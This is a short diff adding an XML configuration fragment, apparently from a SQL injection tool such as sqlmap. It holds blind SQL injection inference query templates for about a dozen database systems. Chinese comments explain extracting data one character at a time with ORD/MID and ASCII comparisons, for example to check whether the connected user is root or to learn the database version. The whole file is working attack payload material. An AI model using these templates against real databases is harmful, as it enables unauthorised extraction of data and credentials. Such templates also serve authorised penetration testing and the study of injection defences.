@@ -1,0 +1,46 @@
+<!-- 推断数据库版本 -->
+
+<!-- MySQL -->
+<!-- AND ORD(MID(USER(),1,1))=114 判断数据库权限是不是root -->
+<!-- USER()函数返回当前连接数据库的用户名 -->
+<!-- MID截取用户名第一个字符 -->
+<!-- ORD() 函数返回字符串第一个字符的 ASCII 值 -->
+<!-- 然后和ASCII码114进行比较，以此判断是不是root用户，r的ASCII码是114 -->
+<!-- and ord(mid(version(),1,1))>51 判断版本号 -->
+<inference query="ORD(MID((%s),%d,1))>%d"/>
+
+<!-- PostgreSQL -->
+<!-- ASCII得到某一个字符的ASCII值 -->
+<!-- 类似于mysql中的ORD(MID((%s),%d,1))>%d语句 -->
+<!-- 通过比较ASCII码判断是不是root用户或者用来判断数据库版本号 -->
+<inference query="ASCII(SUBSTRING((%s)::text FROM %d FOR 1))>%d"/>
+
+<!-- Microsoft SQL Server -->
+<inference query="UNICODE(SUBSTRING((%s),%d,1))>%d"/>
+
+<!-- Microsoft Access -->
+<inference query="ASCW(MID((%s),%d,1))>%d"/>
+
+<!-- Oracle -->
+<inference query="ASCII(SUBSTRC((%s),%d,1))>%d"/>
+
+<!-- SQLite -->
+<inference query="SUBSTR((%s),%d,1)>'%c'"/>
+
+<!-- Informix -->
+<inference query="ASCII(SUBSTR((SELECT * FROM (%s)),%d,1))>%d"/>
+
+<!-- IBM DB2 -->
+<inference query="SUBSTR((%s),%d,1)>'%c'"/>
+
+<!-- Hyper SQL Database -->
+<inference query="ASCII(SUBSTR((%s),%d,1))>%d"/>
+
+<!-- Sybase -->
+<inference query="ASCII(SUBSTRING((%s),%d,1))>%d"/>
+
+<!-- Firebird -->
+<inference query="ASCII_VAL(SUBSTRING((%s) FROM %d FOR 1))>%d" dbms_version="&gt;=2.1" query2="SUBSTRING((%s) FROM %d FOR 1)>'%c'"/>
+
+<!-- SAP MaxDB -->
+<inference query="SUBSTR((%s),%d,1)>'%c'"/>
